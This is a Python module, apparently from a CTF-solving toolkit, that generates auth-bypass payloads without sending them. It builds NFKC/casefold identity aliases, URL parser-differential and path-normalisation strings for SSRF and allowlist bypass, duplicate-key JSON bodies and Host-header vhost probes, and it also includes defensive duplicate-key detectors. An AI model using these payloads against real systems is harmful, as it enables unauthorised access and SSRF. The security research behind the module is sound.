#!/usr/bin/env python3
"""Parser-differential / vhost / NFKC auth-bypass payload engine (B-021).

Four auth/allowlist-gate bypass primitives that CSCTF 2026 web/reverse rows
needed by hand, all made scriptable here.  This engine is offline and
*plan-only*: it never sends a request and never touches the network.  It reads
the challenge's downloaded artifacts (served JS, JSON bodies, OpenAPI/schema
documents) as inert data, flags the differential signals in them with a
no-model static detector, and emits candidate bypass payloads for a human or
model to drive against the live target.

The four primitives (each a pure, independently testable function):

* ``nfkc_casefold_aliases`` — identity aliases that a plain-casefold
  distinctness check reads as *different* from a target but that collapse onto
  it under full NFKC+casefold folding (CSCTF 9098 Interlock: ``k.vostra`` vs
  ``k.vostrª``).
* ``url_parser_differentials`` / ``path_normalization_variants`` — host and
  path payloads two URL parsers disagree on (CSCTF 9098/9105: the
  ``fast-uri`` vs WHATWG backslash host split, the ``/./ops`` edge bypass).
* ``dual_key_json`` / ``case_variant_body`` — raw JSON bodies carrying
  duplicate / case-variant keys so a case-sensitive reader and a
  case-insensitive (Go ``encoding/json``) reader see different values
  (CSCTF 9116 Vesper Quay, 9105 Split Horizon).
* ``base64_internal_hosts`` / ``vhost_header_variants`` — base64 blobs in
  served JS decoded to internal hostnames, then Host-header vhost probes
  (CSCTF 9122 switchboard: ``exch-ctl.vjod.internal``).

``detect_duplicate_case_keys`` is the static duplicate-key-with-different-case
detector called out in the build spec's blocker: a no-model flag over decrypted
JSON.

Untrusted-data rule: every input string is treated as data.  No value read from
an artifact is ever evaluated, imported or executed.
"""
from __future__ import annotations

import base64
import binascii
import json
import re
import string
import unicodedata
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Iterable, Sequence

try:  # the checkout root is on sys.path under the engine runner; be robust to direct import too
    from ctf.result import Cost, Evidence, SolverResult
except ModuleNotFoundError:  # pragma: no cover - exercised only outside the engine sys.path
    import sys as _sys

    _sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
    from ctf.result import Cost, Evidence, SolverResult


ENGINE_ID = "web.parser_differential"

# Folding helpers ----------------------------------------------------------

def fold(s: str) -> str:
    """Full identity fold: NFKC, casefold, NFKC again.

    casefold() can emit text that is no longer NFKC-normalised, so a second
    NFKC pass is required before two identities can be compared safely.  This is
    the fold an allowlist *should* use; the aliases below defeat gates that fold
    less.
    """
    return unicodedata.normalize("NFKC", unicodedata.normalize("NFKC", s).casefold())


# Range scanned for NFKC confusables.  Covers Latin-1 Supplement, the Latin
# Extended / letterlike / superscript / enclosed / fullwidth blocks and the
# Mathematical Alphanumeric Symbols where almost every ASCII-folding confusable
# lives, without walking the whole code space on import.
_CONFUSABLE_MAX = 0x1D800
_ALIAS_TARGETS = frozenset(string.ascii_lowercase + string.digits)
_confusable_map: dict[str, list[str]] | None = None


def _confusables() -> dict[str, list[str]]:
    """{ascii char: [source chars whose full fold is that char but that are
    distinct from it under plain casefold]}.  Built once, deterministic."""
    global _confusable_map
    if _confusable_map is not None:
        return _confusable_map
    out: dict[str, list[str]] = {c: [] for c in _ALIAS_TARGETS}
    for cp in range(0x80, _CONFUSABLE_MAX):
        c = chr(cp)
        if not c.isprintable():
            continue
        f = fold(c)
        if len(f) != 1 or f not in _ALIAS_TARGETS:
            continue
        # must be a real bypass: a plain casefold still tells it apart from the
        # ascii target, yet the full fold collapses them.
        if c.casefold() == f:
            continue
        out[f].append(c)
    _confusable_map = {k: v for k, v in out.items() if v}
    return _confusable_map


def nfkc_casefold_aliases(target: str, *, limit: int = 32, max_subs: int = 1) -> list[str]:
    """Aliases of ``target`` that defeat a plain-casefold distinctness check.

    Every returned alias ``a`` satisfies ``fold(a) == fold(target)`` (same
    identity after full NFKC+casefold folding) while
    ``a.casefold() != target.casefold()`` (a case-folding-only gate reads it as
    a *different* identity).  ``max_subs`` positions are substituted with
    confusables; results are deterministic and capped at ``limit``.
    """
    if not isinstance(target, str) or not target:
        raise ValueError("target must be a non-empty string")
    if max_subs < 1:
        raise ValueError("max_subs must be >= 1")
    cmap = _confusables()
    target_fold = fold(target)
    target_plain = target.casefold()
    # Candidate replacements per position: confusables that fold to the folded
    # form of the char at that position.
    per_pos: list[list[str]] = []
    for ch in target:
        key = fold(ch)
        per_pos.append(sorted(cmap.get(key, []), key=ord) if len(key) == 1 else [])

    seen: set[str] = set()
    out: list[str] = []

    def emit(cand: str) -> bool:
        if cand in seen or cand == target:
            return False
        if cand.casefold() == target_plain:
            return False
        if fold(cand) != target_fold:
            return False
        seen.add(cand)
        out.append(cand)
        return len(out) >= limit

    # One substitution at a time first (most useful, smallest change), then grow.
    from itertools import combinations

    for subs in range(1, max_subs + 1):
        for positions in combinations(range(len(target)), subs):
            choice_lists = [per_pos[p] for p in positions]
            if any(not cl for cl in choice_lists):
                continue
            # bounded cartesian product so a long identity cannot explode
            stack = [(0, list(target))]
            # iterate choices deterministically
            import itertools

            for combo in itertools.product(*choice_lists):
                chars = list(target)
                for p, c in zip(positions, combo):
                    chars[p] = c
                if emit("".join(chars)):
                    return out
    return out


# URL parser differentials -------------------------------------------------

_SCHEMES = ("http", "https")


def url_parser_differentials(
    allowed: str,
    *,
    target: str | None = None,
    path: str = "/",
    scheme: str = "http",
) -> list[dict[str, str]]:
    """URL payloads two parsers route to different hosts.

    ``allowed`` is the host an allowlist accepts; ``target`` is the host the
    attacker wants a second parser to actually dial (SSRF / allowlist bypass).
    Each item is ``{"payload", "mechanism", "note"}``.  Cross-host mechanisms
    are emitted only when ``target`` is given; host-equivalence mechanisms
    (which only need ``allowed``) are always emitted.
    """
    if not allowed:
        raise ValueError("allowed host is required")
    if scheme not in _SCHEMES:
        raise ValueError(f"scheme must be one of {_SCHEMES}")
    if not path.startswith("/"):
        path = "/" + path
    s = scheme
    out: list[dict[str, str]] = []

    def add(payload: str, mechanism: str, note: str) -> None:
        out.append({"payload": payload, "mechanism": mechanism, "note": note})

    # Host-equivalence forms (only need the allowed host).
    add(f"{s}://{allowed}.{path}", "trailing-dot-host",
        "a trailing dot on the host is equal to many resolvers but may miss a literal allowlist")
    add(f"{s}://{allowed.upper()}{path}", "host-case",
        "uppercased host: DNS is case-insensitive, a string allowlist may not be")

    if target:
        add(f"{s}://{allowed}\\@{target}{path}", "backslash-authority",
            "fast-uri/WHATWG split the backslash differently; one reads host=allowed, the other host=target")
        add(f"{s}://{target}\\@{allowed}{path}", "backslash-authority-rev",
            "reverse of the backslash split for parsers that keep the left side")
        add(f"{s}://{allowed}@{target}{path}", "userinfo-at",
            "everything before @ is userinfo to an RFC parser; a naive prefix check sees allowed")
        add(f"{s}://{allowed}@{target}@{allowed}{path}", "double-at",
            "two @ signs: parsers disagree on which is the authority delimiter")
        add(f"{s}://{target}#@{allowed}{path}", "fragment-at",
            "fragment starts at #, so host=target; a parser that scans for @ before # may read allowed")
        add(f"{s}://{allowed}#{target}{path}", "fragment-host",
            "host=allowed, target hidden in the fragment for a parser that reuses it")
        add(f"{s}://{allowed}%2f{target}{path}", "encoded-slash-authority",
            "an encoded slash in the authority: one parser decodes it (path), another keeps host=allowed...target")
        add(f"{s}://{allowed}%09{target}{path}", "tab-in-authority",
            "a tab inside the authority is stripped by some parsers, shifting the host")
        add(f"{s}://{allowed}%0d%0a{target}{path}", "crlf-in-authority",
            "CRLF inside the authority: strippers vs. literal readers disagree on the host")
    return out


def path_normalization_variants(path: str) -> list[dict[str, str]]:
    """Variants of a restricted path that a normalising edge and a raw backend
    read differently (CSCTF 9098: ``/ops`` blocked, ``/./ops`` reaches it)."""
    if not path.startswith("/"):
        path = "/" + path
    head, _, tail = path[1:].partition("/")
    seg = head
    rest = ("/" + tail) if tail else ""
    out: list[dict[str, str]] = []

    def add(payload: str, mechanism: str, note: str) -> None:
        out.append({"payload": payload, "mechanism": mechanism, "note": note})

    add(f"/./{seg}{rest}", "dot-segment",
        "a /./ prefix is collapsed by a normaliser but passed raw (curl --path-as-is) to a backend that matched the literal path")
    add(f"/%2e/{seg}{rest}", "encoded-dot-segment",
        "percent-encoded dot segment: decoded-then-normalised vs. matched raw")
    add(f"//{seg}{rest}", "double-slash",
        "a leading double slash defeats an exact-prefix allow/deny check that keyed on a single slash")
    add(f"/x/../{seg}{rest}", "parent-traversal",
        "a /../ from an allowed sibling that a normaliser collapses onto the target but a raw matcher does not")
    add(f"/%2e%2e/{seg}{rest}", "encoded-parent",
        "encoded parent segment")
    add(f"/{seg};/{tail}" if tail else f"/{seg};", "path-param",
        "a ; path parameter is dropped by some routers and kept by others")
    add(f"/{seg.upper()}{rest}", "segment-case",
        "uppercased segment: case-insensitive route vs. case-sensitive allowlist")
    return out


# Duplicate / case-variant JSON keys ---------------------------------------

def dual_key_json(entries: Sequence[tuple[str, Any]], *, sort_keys: bool = False) -> str:
    """Serialise an *ordered* list of ``(key, value)`` pairs into a JSON object,
    preserving duplicate and case-variant keys.

    ``json.dumps`` silently drops all but the last of a duplicate key, so it
    cannot build these bodies; this serialiser keeps every pair in order.  A
    last-wins case-insensitive parser (Go ``encoding/json``) resolves to the
    final value per folded key; a case-sensitive or first-wins parser resolves
    differently — which is the differential.
    """
    if sort_keys:
        raise ValueError("sort_keys would destroy the ordering these bodies rely on")
    parts = []
    for item in entries:
        if not (isinstance(item, tuple) and len(item) == 2):
            raise ValueError("entries must be (key, value) tuples")
        key, value = item
        if not isinstance(key, str):
            raise ValueError("keys must be strings")
        parts.append(json.dumps(key, ensure_ascii=False) + ":" + json.dumps(value, ensure_ascii=False))
    return "{" + ",".join(parts) + "}"


def _case_variant(name: str, style: str) -> str:
    if style == "title":
        return name[:1].upper() + name[1:]
    if style == "upper":
        return name.upper()
    if style == "lower":
        return name.lower()
    raise ValueError(f"unknown case style {style!r}")


def case_variant_body(
    primary: dict[str, Any],
    shadow: dict[str, Any],
    *,
    shadow_case: str = "title",
) -> str:
    """Build a dual-key JSON body.

    ``primary`` keys are written verbatim (what a case-sensitive, exact-match
    reader keyed on those names sees); each ``shadow`` key is re-cased by
    ``shadow_case`` and appended (what a reader keyed on the re-cased name, or a
    case-insensitive last-wins reader, sees).  Returns raw JSON text.
    """
    entries: list[tuple[str, Any]] = list(primary.items())
    for k, v in shadow.items():
        entries.append((_case_variant(k, shadow_case), v))
    return dual_key_json(entries)


def _walk_json_pairs(node: Any, pointer: str, findings: list[dict[str, Any]]) -> None:
    if isinstance(node, _PairObj):
        buckets: dict[str, list[str]] = {}
        order: list[str] = []
        for k, _v in node.pairs:
            f = k.casefold()
            if f not in buckets:
                buckets[f] = []
                order.append(f)
            buckets[f].append(k)
        for f in order:
            keys = buckets[f]
            if len(keys) > 1:
                distinct = sorted(set(keys))
                kind = "exact-duplicate" if len(distinct) == 1 else "case-variant"
                findings.append({"path": pointer or "/", "keys": keys, "kind": kind})
        for k, v in node.pairs:
            child = pointer + "/" + k.replace("~", "~0").replace("/", "~1")
            _walk_json_pairs(v, child, findings)
    elif isinstance(node, list):
        for i, v in enumerate(node):
            _walk_json_pairs(v, f"{pointer}/{i}", findings)


@dataclass
class _PairObj:
    pairs: list[tuple[str, Any]]


def detect_duplicate_case_keys(text: str) -> list[dict[str, Any]]:
    """Static detector: JSON objects (at any depth) whose keys collide under
    casefold or are exact duplicates.  The no-model flag from the B-021 blocker.

    Returns ``[{"path", "keys", "kind"}]`` where ``kind`` is ``case-variant``
    (distinct spellings, same fold, e.g. ``courier`` & ``Courier``) or
    ``exact-duplicate`` (the same spelling twice).  Raises ``ValueError`` on
    text that is not JSON.
    """
    def hook(pairs: list[tuple[str, Any]]) -> _PairObj:
        return _PairObj(list(pairs))

    try:
        root = json.loads(text, object_pairs_hook=hook)
    except json.JSONDecodeError as e:
        raise ValueError(f"not JSON: {e}") from e
    findings: list[dict[str, Any]] = []
    _walk_json_pairs(root, "", findings)
    return findings


# vhost / base64 host discovery --------------------------------------------

_B64_RE = re.compile(r"[A-Za-z0-9+/]{12,}={0,2}")
_B64URL_RE = re.compile(r"[A-Za-z0-9_-]{12,}={0,2}")
_HOSTNAME_RE = re.compile(
    r"^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?:\.[A-Za-z0-9-]{1,63})+\.?$"
)
_INTERNAL_TLDS = (".internal", ".local", ".lan", ".corp", ".intra", ".svc", ".test", ".invalid")


def _looks_hostname(s: str) -> bool:
    return bool(_HOSTNAME_RE.match(s)) and not s.replace(".", "").isdigit()


def base64_internal_hosts(text: str) -> list[dict[str, Any]]:
    """Find base64 blobs in ``text`` (e.g. served JS) that decode to hostnames.

    CSCTF 9122: ``atob('ZXhjaC1jdGwudmpvZC5pbnRlcm5hbA==')`` ->
    ``exch-ctl.vjod.internal``.  Returns ``[{"encoded", "decoded",
    "looks_internal"}]``, internal-looking hosts first, deterministic.
    """
    seen: set[str] = set()
    out: list[dict[str, Any]] = []
    for rx, altchars in ((_B64_RE, None), (_B64URL_RE, b"-_")):
        for m in rx.finditer(text):
            tok = m.group(0)
            if tok in seen:
                continue
            pad = tok + "=" * (-len(tok) % 4)
            try:
                raw = base64.b64decode(pad, altchars=altchars, validate=True)
            except (binascii.Error, ValueError):
                continue
            try:
                dec = raw.decode("ascii")
            except UnicodeDecodeError:
                continue
            if not _looks_hostname(dec):
                continue
            seen.add(tok)
            out.append({
                "encoded": tok,
                "decoded": dec,
                "looks_internal": any(dec.rstrip(".").endswith(t) for t in _INTERNAL_TLDS),
            })
    out.sort(key=lambda d: (not d["looks_internal"], d["decoded"]))
    return out


def vhost_header_variants(host: str, *, path: str = "/") -> list[dict[str, str]]:
    """Request mutations that route a public port to an internal vhost.

    Each item is ``{"mechanism", "header", "value"}`` (or ``request_line`` for
    absolute-form).  Drives the Host-header confusion in CSCTF 9122.
    """
    if not host:
        raise ValueError("host is required")
    out: list[dict[str, str]] = [
        {"mechanism": "host-header", "header": "Host", "value": host},
        {"mechanism": "host-port", "header": "Host", "value": f"{host}:80"},
        {"mechanism": "forwarded-host", "header": "X-Forwarded-Host", "value": host},
        {"mechanism": "x-host", "header": "X-Host", "value": host},
        {"mechanism": "forwarded-server", "header": "X-Forwarded-Server", "value": host},
        {"mechanism": "absolute-form", "request_line": f"GET http://{host}{path} HTTP/1.1"},
    ]
    return out


# OpenAPI / schema dual-casing hint ----------------------------------------

def openapi_case_collisions(text: str) -> list[dict[str, Any]]:
    """Flag schema/property names that appear in both a lower and a re-cased
    form within one JSON document (e.g. ``courier`` & ``Courier`` in an OpenAPI
    body): a hint that two readers key fields differently (CSCTF 9116)."""
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        return []
    names: dict[str, set[str]] = {}

    def visit(node: Any) -> None:
        if isinstance(node, dict):
            for k, v in node.items():
                if isinstance(k, str) and k.isalpha():
                    names.setdefault(k.casefold(), set()).add(k)
                visit(v)
        elif isinstance(node, list):
            for v in node:
                visit(v)

    visit(data)
    out = []
    for folded, variants in sorted(names.items()):
        if len(variants) > 1:
            out.append({"folded": folded, "variants": sorted(variants)})
    return out


# The contract engine ------------------------------------------------------

_TEXT_SUFFIXES = {".json", ".ndjson", ".js", ".mjs", ".ts", ".txt", ".yaml", ".yml", ".har", ".log"}
_MAX_FILE_BYTES = 4 * 1024 * 1024
_MAX_FILES = 400
_SKIP_DIR_NAMES = {".ctf", ".git", "__pycache__"}


def _read_text(p: Path) -> str | None:
    try:
        if p.stat().st_size > _MAX_FILE_BYTES:
            return None
        return p.read_bytes().decode("utf-8", "replace")
    except OSError:
        return None


def _iter_files(root: Path) -> Iterable[Path]:
    count = 0
    for p in sorted(root.rglob("*")):
        if any(part in _SKIP_DIR_NAMES or part.startswith(".") for part in p.relative_to(root).parts):
            continue
        if not p.is_file():
            continue
        if p.suffix.lower() not in _TEXT_SUFFIXES:
            continue
        count += 1
        if count > _MAX_FILES:
            break
        yield p


def solve(challenge_dir: Path, profile: Any = None, **opts: Any) -> SolverResult:
    """Scan a challenge's artifacts for parser-differential / vhost / NFKC
    signals and emit candidate auth-bypass payloads.

    Offline and plan-only: produces a payload catalogue, never a flag and never
    a request.  ``opts`` may add explicit generation targets:
    ``target`` (identity to alias), ``allowed_host`` + ``internal_host``
    (URL differentials), ``restricted_path``, and ``dual_primary`` +
    ``dual_shadow`` (JSON dicts for a dual-key body).
    """
    cdir = Path(challenge_dir)
    if not cdir.exists() or not cdir.is_dir():
        return SolverResult(
            status="blocked",
            engine=ENGINE_ID,
            notes=f"challenge dir not found or not a directory: {challenge_dir}",
        )

    evidence: list[Evidence] = []
    catalog: dict[str, Any] = {"detectors": {}, "payloads": {}}

    for f in _iter_files(cdir):
        rel = str(f.relative_to(cdir))
        text = _read_text(f)
        if text is None:
            continue
        suffix = f.suffix.lower()

        if suffix in {".json", ".ndjson", ".har", ".yaml", ".yml", ".txt", ".log"}:
            try:
                dup = detect_duplicate_case_keys(text)
            except ValueError:
                dup = []
            if dup:
                catalog["detectors"].setdefault("duplicate_case_keys", []).append({"file": rel, "findings": dup})
                for d in dup[:4]:
                    evidence.append(Evidence(
                        kind="match",
                        detail=f"{d['kind']} JSON keys at {d['path']}: {', '.join(d['keys'])}",
                        path=rel,
                    ))
            coll = openapi_case_collisions(text)
            if coll:
                catalog["detectors"].setdefault("schema_case_collisions", []).append({"file": rel, "collisions": coll})
                for c in coll[:4]:
                    evidence.append(Evidence(
                        kind="match",
                        detail=f"schema field keyed in two cases: {', '.join(c['variants'])}",
                        path=rel,
                    ))

        if suffix in {".js", ".mjs", ".ts", ".txt", ".html", ".har"}:
            hosts = base64_internal_hosts(text)
            if hosts:
                catalog["detectors"].setdefault("base64_hosts", []).append({"file": rel, "hosts": hosts})
                for h in hosts[:4]:
                    tag = " (internal)" if h["looks_internal"] else ""
                    evidence.append(Evidence(
                        kind="decode",
                        detail=f"base64 {h['encoded'][:24]}... -> host {h['decoded']}{tag}",
                        path=rel,
                    ))
                    catalog["payloads"].setdefault("vhost", []).extend(
                        vhost_header_variants(h["decoded"])
                    )

    # Opt-driven direct generation (no artifact needed).
    if isinstance(opts.get("target"), str):
        aliases = nfkc_casefold_aliases(opts["target"], limit=int(opts.get("alias_limit", 16)))
        catalog["payloads"]["nfkc_aliases"] = aliases
        if aliases:
            evidence.append(Evidence(kind="plan", detail=f"{len(aliases)} NFKC/casefold aliases of {opts['target']!r}"))
    allowed = opts.get("allowed_host")
    if isinstance(allowed, str):
        catalog["payloads"]["url_differentials"] = url_parser_differentials(
            allowed, target=opts.get("internal_host"), path=opts.get("restricted_path", "/")
        )
    if isinstance(opts.get("restricted_path"), str):
        catalog["payloads"]["path_variants"] = path_normalization_variants(opts["restricted_path"])
    if isinstance(opts.get("dual_primary"), dict) and isinstance(opts.get("dual_shadow"), dict):
        catalog["payloads"]["dual_key_body"] = case_variant_body(
            opts["dual_primary"], opts["dual_shadow"], shadow_case=opts.get("shadow_case", "title")
        )

    fired = bool(catalog["detectors"]) or bool(catalog["payloads"])
    notes = json.dumps(catalog, ensure_ascii=False, sort_keys=True)
    if fired:
        return SolverResult(
            status="unsure",
            engine=ENGINE_ID,
            evidence=tuple(evidence),
            cost=Cost(),
            notes=notes,
        )
    return SolverResult(
        status="none",
        engine=ENGINE_ID,
        notes="no parser-differential / vhost / NFKC signal in the artifacts; "
              "pass --opt target=, --opt allowed_host=, etc. to generate payloads directly",
    )
